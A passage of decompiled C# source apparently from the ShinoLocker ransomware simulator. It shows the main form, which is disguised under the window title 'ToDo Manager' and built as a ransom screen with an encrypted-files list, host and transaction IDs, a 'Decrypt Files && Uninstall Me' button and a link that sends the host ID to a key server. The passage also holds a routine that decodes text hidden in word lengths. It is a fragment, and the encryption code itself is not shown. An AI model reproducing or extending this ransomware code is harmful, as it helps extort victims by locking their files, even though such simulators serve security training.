        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_26;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_21;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_26:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void lnkGetKey_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start(this.UU + "?h=" + this.H + "&t=" + Uri.EscapeDataString(this.V) + "#key");

    private string DC(string t)
    {
      string str1;
      try
      {
        t = Strings.Replace(t, "\t", " ");
        t = Strings.Replace(t, "\r", " ");
        t = Strings.Replace(t, "\n", " ");
        t = Strings.Replace(t, "\0", " ");
        int CharCode1 = 33;
        do
        {
          t = Strings.Replace(t, Conversions.ToString(Strings.Chr(CharCode1)), " ");
          checked { ++CharCode1; }
        }
        while (CharCode1 <= 47);
        int CharCode2 = 58;
        do
        {
          t = Strings.Replace(t, Conversions.ToString(Strings.Chr(CharCode2)), " ");
          checked { ++CharCode2; }
        }
        while (CharCode2 <= 64);
        int CharCode3 = 91;
        do
        {
          t = Strings.Replace(t, Conversions.ToString(Strings.Chr(CharCode3)), " ");
          checked { ++CharCode3; }
        }
        while (CharCode3 <= 96);
        int CharCode4 = 123;
        do
        {
          t = Strings.Replace(t, Conversions.ToString(Strings.Chr(CharCode4)), " ");
          checked { ++CharCode4; }
        }
        while (CharCode4 <= (int) byte.MaxValue);
        while (Strings.InStr(t, "  ") != 0)
          t = Strings.Replace(t, "  ", " ");
        string[] strArray = Strings.Split(Strings.Trim(t));
        if (strArray.Length % 2 != 0)
        {
          str1 = "Encode Error";
        }
        else
        {
          string str2 = "";
          int num = checked (strArray.Length - 2);
          int index = 0;
          while (index <= num)
          {
            if (!(checked (Strings.Len(strArray[index]) - 2) > 16 | checked (Strings.Len(strArray[index + 1]) - 2) > 16))
              str2 += Conversions.ToString(Strings.Chr(checked ((int) Convert.ToInt64(Conversion.Hex(Strings.Len(strArray[index]) - 2) + Conversion.Hex(Strings.Len(strArray[index + 1]) - 2), 16))));
            checked { index += 2; }
          }
          str1 = str2;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Interaction.InputBox("Error:", "ERROR", ex.Message + " " + t);
        str1 = "Encode Error";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (frmMain));
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Header = new Panel();
      this.lblServer = new Label();
      this.Panel1 = new Panel();
      this.lblInputKey = new Label();
      this.lblStep3 = new Label();
      this.lblStep2 = new Label();
      this.lblGetTheKey = new Label();
      this.lblStep1 = new Label();
      this.lnkGetKey = new LinkLabel();
      this.BottomUp = new Panel();
      this.lblTransaction = new TextBox();
      this.txtTID = new MaskedTextBox();
      this.txtHID = new TextBox();
      this.lblHost = new TextBox();
      this.btnValidateKey = new Button();
      this.txtKey = new MaskedTextBox();
      this.Panel2 = new Panel();
      this.chkFile = new CheckedListBox();
      this.chkMain = new CheckedListBox();
      this.Panel3 = new Panel();
      this.lblEncryptedFile = new Label();
      this.Label1 = new Label();
      this.Header.SuspendLayout();
      this.Panel1.SuspendLayout();
      this.BottomUp.SuspendLayout();
      this.Panel2.SuspendLayout();
      this.Panel3.SuspendLayout();
      this.SuspendLayout();
      this.Timer1.Interval = 1000;
      this.Header.BackColor = System.Drawing.Color.Black;
      this.Header.Controls.Add((Control) this.lblServer);
      this.Header.Dock = DockStyle.Top;
      this.Header.Location = new Point(0, 0);
      this.Header.Name = "Header";
      this.Header.Size = new Size(873, 44);
      this.Header.TabIndex = 0;
      this.lblServer.AutoSize = true;
      this.lblServer.BackColor = System.Drawing.Color.Black;
      this.lblServer.Dock = DockStyle.Left;
      this.lblServer.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.lblServer.ForeColor = System.Drawing.Color.Lime;
      this.lblServer.Location = new Point(0, 0);
      this.lblServer.Name = "lblServer";
      this.lblServer.Size = new Size(96, 28);
      this.lblServer.TabIndex = 2;
      this.lblServer.Text = "SERVER";
      this.Panel1.BackColor = System.Drawing.Color.White;
      this.Panel1.Controls.Add((Control) this.lblInputKey);
      this.Panel1.Controls.Add((Control) this.lblStep3);
      this.Panel1.Controls.Add((Control) this.lblStep2);
      this.Panel1.Controls.Add((Control) this.lblGetTheKey);
      this.Panel1.Controls.Add((Control) this.lblStep1);
      this.Panel1.Controls.Add((Control) this.lnkGetKey);
      this.Panel1.Controls.Add((Control) this.BottomUp);
      this.Panel1.Controls.Add((Control) this.btnValidateKey);
      this.Panel1.Controls.Add((Control) this.txtKey);
      this.Panel1.Dock = DockStyle.Bottom;
      this.Panel1.ForeColor = System.Drawing.Color.Black;
      this.Panel1.Location = new Point(0, 383);
      this.Panel1.Name = "Panel1";
      this.Panel1.Size = new Size(873, 222);
      this.Panel1.TabIndex = 1;
      this.lblInputKey.AutoSize = true;
      this.lblInputKey.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.lblInputKey.ForeColor = System.Drawing.Color.Black;
      this.lblInputKey.Location = new Point(116, (int) sbyte.MaxValue);
      this.lblInputKey.Name = "lblInputKey";
      this.lblInputKey.Size = new Size(152, 20);
      this.lblInputKey.TabIndex = 13;
      this.lblInputKey.Text = "Input the key";
      this.lblInputKey.Visible = false;
      this.lblStep3.AutoSize = true;
      this.lblStep3.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.lblStep3.ForeColor = System.Drawing.Color.Black;
      this.lblStep3.Location = new Point(30, 178);
      this.lblStep3.Name = "lblStep3";
      this.lblStep3.Size = new Size(75, 20);
      this.lblStep3.TabIndex = 12;
      this.lblStep3.Text = "STEP3:";
      this.lblStep3.Visible = false;
      this.lblStep2.AutoSize = true;
      this.lblStep2.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.lblStep2.ForeColor = System.Drawing.Color.Black;
      this.lblStep2.Location = new Point(30, 126);
      this.lblStep2.Name = "lblStep2";
      this.lblStep2.Size = new Size(75, 20);
      this.lblStep2.TabIndex = 11;
      this.lblStep2.Text = "STEP2:";
      this.lblStep2.Visible = false;
      this.lblGetTheKey.AutoSize = true;
      this.lblGetTheKey.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.lblGetTheKey.ForeColor = System.Drawing.Color.Black;
      this.lblGetTheKey.Location = new Point(116, 75);
      this.lblGetTheKey.Name = "lblGetTheKey";
      this.lblGetTheKey.Size = new Size(185, 20);
      this.lblGetTheKey.TabIndex = 10;
      this.lblGetTheKey.Text = "Get the key from";
      this.lblGetTheKey.Visible = false;
      this.lblStep1.AutoSize = true;
      this.lblStep1.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.lblStep1.ForeColor = System.Drawing.Color.Black;
      this.lblStep1.Location = new Point(30, 75);
      this.lblStep1.Name = "lblStep1";
      this.lblStep1.Size = new Size(75, 20);
      this.lblStep1.TabIndex = 9;
      this.lblStep1.Text = "STEP1:";
      this.lblStep1.Visible = false;
      this.lnkGetKey.ActiveLinkColor = System.Drawing.Color.Lime;
      this.lnkGetKey.AutoSize = true;
      this.lnkGetKey.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.lnkGetKey.ForeColor = System.Drawing.Color.Black;
      this.lnkGetKey.LinkColor = System.Drawing.Color.Lime;
      this.lnkGetKey.Location = new Point(307, 67);
      this.lnkGetKey.Name = "lnkGetKey";
      this.lnkGetKey.Size = new Size(264, 28);
      this.lnkGetKey.TabIndex = 8;
      ((Label) this.lnkGetKey).TabStop = true;
      this.lnkGetKey.Text = "ShinoLocker Server";
      this.lnkGetKey.Visible = false;
      this.BottomUp.Controls.Add((Control) this.lblTransaction);
      this.BottomUp.Controls.Add((Control) this.txtTID);
      this.BottomUp.Controls.Add((Control) this.txtHID);
      this.BottomUp.Controls.Add((Control) this.lblHost);
      this.BottomUp.Dock = DockStyle.Top;
      this.BottomUp.Location = new Point(0, 0);
      this.BottomUp.Name = "BottomUp";
      this.BottomUp.Size = new Size(873, 47);
      this.BottomUp.TabIndex = 5;
      this.lblTransaction.BackColor = System.Drawing.Color.White;
      this.lblTransaction.BorderStyle = BorderStyle.None;
      this.lblTransaction.Cursor = Cursors.Arrow;
      this.lblTransaction.Dock = DockStyle.Right;
      this.lblTransaction.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.lblTransaction.ForeColor = System.Drawing.Color.Lime;
      this.lblTransaction.Location = new Point(196, 0);
      this.lblTransaction.Name = "lblTransaction";
      this.lblTransaction.ReadOnly = true;
      this.lblTransaction.Size = new Size(220, 27);
      this.lblTransaction.TabIndex = 6;
      this.lblTransaction.TabStop = false;
      this.lblTransaction.Text = "TRANSACTION ID:";
      this.lblTransaction.Visible = false;
      this.txtTID.BackColor = System.Drawing.Color.White;
      this.txtTID.CutCopyMaskFormat = MaskFormat.ExcludePromptAndLiterals;
      this.txtTID.Dock = DockStyle.Right;
      this.txtTID.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.txtTID.ForeColor = System.Drawing.Color.Black;
      this.txtTID.Location = new Point(416, 0);
      this.txtTID.Mask = "CCCC-CCCC-CCCC-CCCC-CCCC-CCCC";
      this.txtTID.Name = "txtTID";
      this.txtTID.ReadOnly = true;
      this.txtTID.Size = new Size(457, 34);
      this.txtTID.TabIndex = 5;
      this.txtTID.Text = "AAAABBBBCCCCDDDDEEEEFFFF";
      this.txtTID.TextMaskFormat = MaskFormat.ExcludePromptAndLiterals;
      this.txtTID.Visible = false;
      this.txtHID.BackColor = System.Drawing.Color.White;
      this.txtHID.BorderStyle = BorderStyle.None;
      this.txtHID.Dock = DockStyle.Left;
      this.txtHID.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.txtHID.ForeColor = System.Drawing.Color.Black;
      this.txtHID.Location = new Point(120, 0);
      this.txtHID.Name = "txtHID";
      this.txtHID.ReadOnly = true;
      this.txtHID.Size = new Size(120, 27);
      this.txtHID.TabIndex = 2;
      this.txtHID.Text = "99999";
      this.txtHID.Visible = false;
      this.lblHost.BackColor = System.Drawing.Color.White;
      this.lblHost.BorderStyle = BorderStyle.None;
      this.lblHost.Cursor = Cursors.Arrow;
      this.lblHost.Dock = DockStyle.Left;
      this.lblHost.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.lblHost.ForeColor = System.Drawing.Color.Lime;
      this.lblHost.Location = new Point(0, 0);
      this.lblHost.Name = "lblHost";
      this.lblHost.ReadOnly = true;
      this.lblHost.Size = new Size(120, 27);
      this.lblHost.TabIndex = 1;
      this.lblHost.TabStop = false;
      this.lblHost.Text = "HOST ID:";
      this.lblHost.Visible = false;
      this.btnValidateKey.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.btnValidateKey.ForeColor = System.Drawing.Color.Black;
      this.btnValidateKey.Location = new Point(120, 169);
      this.btnValidateKey.Name = "btnValidateKey";
      this.btnValidateKey.Size = new Size(477, 41);
      this.btnValidateKey.TabIndex = 4;
      this.btnValidateKey.Text = "Decrypt Files && Uninstall Me";
      this.btnValidateKey.UseVisualStyleBackColor = true;
      this.btnValidateKey.Visible = false;
      this.txtKey.BackColor = System.Drawing.Color.White;
      this.txtKey.BorderStyle = BorderStyle.None;
      this.txtKey.CutCopyMaskFormat = MaskFormat.ExcludePromptAndLiterals;
      this.txtKey.Font = new Font("ＭＳ ゴシック", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.txtKey.ForeColor = System.Drawing.Color.Lime;
      this.txtKey.Location = new Point(274, 121);
      this.txtKey.Mask = "CCCC-CCCC-CCCC-CCCC-CCCC-CCCC";
      this.txtKey.Name = "txtKey";
      this.txtKey.Size = new Size(552, 27);
      this.txtKey.TabIndex = 3;
      this.txtKey.TextMaskFormat = MaskFormat.ExcludePromptAndLiterals;
      this.txtKey.Visible = false;
      this.Panel2.BackColor = System.Drawing.Color.White;
      this.Panel2.Controls.Add((Control) this.chkFile);
      this.Panel2.Controls.Add((Control) this.chkMain);
      this.Panel2.Controls.Add((Control) this.Panel3);
      this.Panel2.Dock = DockStyle.Fill;
      this.Panel2.Location = new Point(0, 44);
      this.Panel2.Name = "Panel2";
      this.Panel2.Size = new Size(873, 339);
      this.Panel2.TabIndex = 2;
      this.chkFile.BackColor = System.Drawing.Color.Black;
      this.chkFile.Dock = DockStyle.Fill;
      this.chkFile.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.chkFile.ForeColor = System.Drawing.Color.Lime;
      this.chkFile.FormattingEnabled = true;
      this.chkFile.Location = new Point(350, 42);
      this.chkFile.Name = "chkFile";
      this.chkFile.Size = new Size(523, 297);
      this.chkFile.TabIndex = 4;
      this.chkMain.BackColor = System.Drawing.Color.Black;
      this.chkMain.Dock = DockStyle.Left;
      this.chkMain.Font = new Font("ＭＳ ゴシック", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 128);
      this.chkMain.ForeColor = System.Drawing.Color.Lime;
      this.chkMain.FormattingEnabled = true;
      this.chkMain.Location = new Point(0, 42);
      this.chkMain.Name = "chkMain";
      this.chkMain.Size = new Size(350, 297);
      this.chkMain.TabIndex = 3;
      this.Panel3.BackColor = System.Drawing.Color.Black;
      this.Panel3.Controls.Add((Control) this.lblEncryptedFile);
      this.Panel3.Controls.Add((Control) this.Label1);
      this.Panel3.Dock = DockStyle.Top;
      this.Panel3.Location = new Point(0, 0);
      this.Panel3.Name = "Panel3";
      this.Panel3.Size = new Size(873, 42);
      this.Panel3.TabIndex = 2;
      this.lblEncryptedFile.AutoSize = true;
      this.lblEncryptedFile.Font = new Font("MS UI Gothic", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.lblEncryptedFile.ForeColor = System.Drawing.Color.Lime;
      this.lblEncryptedFile.Location = new Point(347, 17);
      this.lblEncryptedFile.Name = "lblEncryptedFile";
      this.lblEncryptedFile.Size = new Size(160, 20);
      this.lblEncryptedFile.TabIndex = 1;
      this.lblEncryptedFile.Text = "Encrypted Files ";
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("MS UI Gothic", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 128);
      this.Label1.ForeColor = System.Drawing.Color.Lime;
      this.Label1.Location = new Point(1, 17);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(90, 20);
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Progress";
      this.AutoScaleDimensions = new SizeF(8f, 15f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Black;
      this.ClientSize = new Size(873, 605);
      this.Controls.Add((Control) this.Panel2);
      this.Controls.Add((Control) this.Panel1);
      this.Controls.Add((Control) this.Header);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MinimumSize = new Size(874, 517);
      this.Name = nameof (frmMain);
      this.Text = "ToDo Manager";
      this.TopMost = true;
      this.Header.ResumeLayout(false);
      this.Header.PerformLayout();
      this.Panel1.ResumeLayout(false);
      this.Panel1.PerformLayout();
      this.BottomUp.ResumeLayout(false);
      this.BottomUp.PerformLayout();
      this.Panel2.ResumeLayout(false);
      this.Panel3.ResumeLayout(false);
      this.Panel3.PerformLayout();
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        System.Windows.Forms.Timer timer1_1 = this._Timer1;
        if (timer1_1 != null)
          timer1_1.Tick -= eventHandler;
        this._Timer1 = value;
        System.Windows.Forms.Timer timer1_2 = this._Timer1;
        if (timer1_2 == null)
          return;
        timer1_2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Header")]
    internal virtual Panel Header { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel2")]
    internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblServer")]
    internal virtual Label lblServer { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtKey")]
    internal virtual MaskedTextBox txtKey { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnValidateKey
    {
      get => this._btnValidateKey;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnValidateKey_Click);
        Button btnValidateKey1 = this._btnValidateKey;
        if (btnValidateKey1 != null)
          btnValidateKey1.Click -= eventHandler;
        this._btnValidateKey = value;
        Button btnValidateKey2 = this._btnValidateKey;
        if (btnValidateKey2 == null)
          return;
        btnValidateKey2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("BottomUp")]
    internal virtual Panel BottomUp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtHID")]
    internal virtual TextBox txtHID { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblHost")]
    internal virtual TextBox lblHost { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtTID")]
    internal virtual MaskedTextBox txtTID { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblTransaction")]
    internal virtual TextBox lblTransaction { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual LinkLabel lnkGetKey
    {
      get => this._lnkGetKey;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.lnkGetKey_LinkClicked);
        LinkLabel lnkGetKey1 = this._lnkGetKey;
        if (lnkGetKey1 != null)
          lnkGetKey1.LinkClicked -= clickedEventHandler;
        this._lnkGetKey = value;
        LinkLabel lnkGetKey2 = this._lnkGetKey;
        if (lnkGetKey2 == null)
          return;
        lnkGetKey2.LinkClicked += clickedEventHandler;
      }
    }

    [field: AccessedThroughProperty("Panel3")]
    internal virtual Panel Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("chkMain")]
    internal virtual CheckedListBox chkMain { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("chkFile")]
    internal virtual CheckedListBox chkFile { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblEncryptedFile")]
    internal virtual Label lblEncryptedFile { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblGetTheKey")]
    internal virtual Label lblGetTheKey { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblStep1")]
    internal virtual Label lblStep1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblInputKey")]
    internal virtual Label lblInputKey { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblStep3")]
    internal virtual Label lblStep3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblStep2")]
    internal virtual Label lblStep2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    private class WebRequestState
    {
      public WebRequest Request;

      public WebRequestState(WebRequest newRequest) => this.Request = newRequest;
    }
  }
}
